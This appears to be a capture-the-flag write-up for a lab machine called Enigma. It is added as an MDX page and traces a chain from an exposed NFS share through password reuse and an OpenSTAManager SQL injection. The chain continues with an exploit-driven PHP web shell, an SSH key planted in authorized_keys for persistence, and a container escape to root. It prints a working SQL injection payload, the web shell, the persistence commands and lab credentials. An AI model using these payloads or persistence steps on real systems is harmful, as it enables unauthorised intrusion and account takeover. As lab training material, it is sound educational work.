@@ -1,0 +1,127 @@
+import { Bild, Code, Block, Marker } from "../components.tsx";
+
+**Disclaimer**: The steps for this writeup are based on my notes and memory, so they might not be 100% accurate. Additionally, I have changed the flags for this writeup, so they won't match the ones on the machine.
+
+<br />
+
+Starting off with an <Code content="nmap" /> scan reveals several interesting services besides the usual SSH and HTTP ports. In particular, an NFS share as well as IMAP and POP3 services stand out.
+
+<Block
+  language="Bash"
+  content={"22\t\t- SSH\n80\t\t- HTTP\n110\t\t- POP3\n111\t\t- RPCBind\n143\t\t- IMAP\n993\t\t- IMAPS\n995\t\t- POP3S\n2049\t- NFS"}
+/>
+
+The first thing I decided to investigate was the NFS share.
+
+<Block
+  language="Bash"
+  content={
+    "showmount -e enigma.htb\nsudo mount -t nfs enigma.htb:/srv/nfs/onboarding /mnt"
+  }
+/>
+
+The mounted share contains a PDF named <Code content="New_Employee_Access.pdf" />, which includes credentials for a newly hired employee. Those credentials are intended for the internal webmail instance running on <Code content="mail001.enigma.htb" />.
+
+<br />
+
+After logging into Roundcube as the new employee, only a welcome email is present. The credentials do not work for SSH because password authentication is disabled, but trying the same password against another employee account turns out to be successful. Sarah's mailbox contains another set of credentials:
+
+<Block
+  language="Text"
+  content={
+    "URL: http://support_001.enigma.htb\nUsername: admin\nPassword: Ne3s4rtars78s"
+  }
+/>
+
+After adding the virtual hosts to <Code content="/etc/hosts" />, the support portal becomes accessible. It is running OpenSTAManager, which is affected by <Marker content="CVE-2026-24418" link="https://github.com/lukacz-rybak/CVE-2026-24418" />.
+
+<br />
+
+The vulnerability allows error-based SQL injection, making it possible to extract arbitrary database contents. First I verified the vulnerability by leaking the database user and version.
+
+<Block
+  language="Bash"
+  content={
+    `curl -b cookies.txt \\
+-d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(USER(),' | ',VERSION()))))%23" \\
+-H "Host: support_001.enigma.htb" \\
+"http://enigma.htb/actions.php?id_module=18"`
+  }
+/>
+
+Once confirmed, the application's database credentials can be extracted from the configuration files, allowing direct access to MySQL.
+
+<Block
+  language="PHP"
+  content={
+    "$db_host = 'localhost';\n$db_username = 'brollin';\n$db_password = 'Fri3nds@9099';"
+  }
+/>
+
+Connecting to the database reveals the <Code content="zz_users" /> table, containing password hashes for the application users. The hash belonging to <Code content="haris" /> can be cracked offline using Hashcat, revealing the password <Code content="bestfriends" />.
+
+<br />
+
+The password unfortunately cannot be used directly for SSH because password authentication is disabled. Fortunately, another OpenSTAManager vulnerability exists. <Marker content="CVE-2025-69212" link="https://github.com/0x00ctrl/htb-stuff/blob/main/machines/Enigma/cve_2025_69212_poc.py" /> allows arbitrary command execution.
+
+After making a small modification to the exploit so it sends the correct <Code content="Host" /> header, I uploaded a simple PHP web shell.
+
+<Block
+  language="Bash"
+  content={
+    `python3 cve_2025_69212_poc.py \\
+-u http://enigma.htb \\
+-c <SESSION_COOKIE> \\
+-cmd 'cd files && echo "<?php system(\\$_GET[\\"c\\"]); ?>" > shell.php'`
+  }
+/>
+
+Although getting a stable reverse shell proved difficult, the web shell was enough to execute commands as <Code content="www-data" />.
+
+<br />
+
+Since I already knew Haris' password, I simply used <Code content="su" /> non-interactively through the web shell to execute commands as him.
+
+<Block
+  language="Bash"
+  content={
+    "echo 'bestfriends' | su -c 'cat /home/haris/user.txt' haris"
+  }
+/>
+
+That confirmed the credentials were valid. The next step was making the access permanent by creating Haris' SSH directory and adding my own public key to <Code content="authorized_keys" /> through the web shell.
+
+<Block
+  language="Bash"
+  content={
+    "mkdir -p /home/haris/.ssh\necho '<MY_PUBLIC_KEY>' >> /home/haris/.ssh/authorized_keys\nchown -R haris:haris /home/haris/.ssh"
+  }
+/>
+
+After that, logging in via SSH as <Code content="haris" /> works immediately and the user flag can be retrieved normally.
+
+<br />
+
+The first thing after obtaining a shell is, as always, running <Code content="sudo -l" />. No luck this time. Enumeration instead reveals a locally running OliveTin instance listening on port <Code content="1337" />. Forwarding the port over SSH exposes the web interface.
+
+Further investigation shows that OliveTin runs as root inside a Docker container and is vulnerable to command injection via <Marker content="CVE-2026-27127" link="https://github.com/OliveTin/OliveTin/security/advisories" />. By abusing the webhook argument parsing flaw, arbitrary commands can be executed as root inside the container. From there, escaping into the host environment yields a root shell, allowing the root flag to be retrieved from <Code content="/root/root.txt" />.
+
+<br />
+
+This machine was all about chaining together seemingly unrelated pieces of information. None of the individual vulnerabilities were particularly difficult, but every step unlocked the next one.
+
+<br />
+
+**Don't ignore NFS**: It's easy to focus on the web server first, but the exposed NFS share immediately handed over the initial credentials. Enumerating every exposed service pays off.
+
+<br />
+
+**Password reuse is always worth checking**: Even though the credentials were intended for webmail, trying them against other users revealed Sarah's mailbox and the next piece of the puzzle.
+
+<br />
+
+**Database access is often more valuable than shell access**: Dumping the application's database revealed password hashes that eventually led to valid system credentials. Sometimes cracking a hash is much easier than fighting for RCE.
+
+<br />
+
+**A web shell is enough**: I spent far too much time trying to get a reverse shell. In the end, a simple PHP web shell together with <Code content="su" /> was all I needed to pivot into the real user account and establish SSH access.
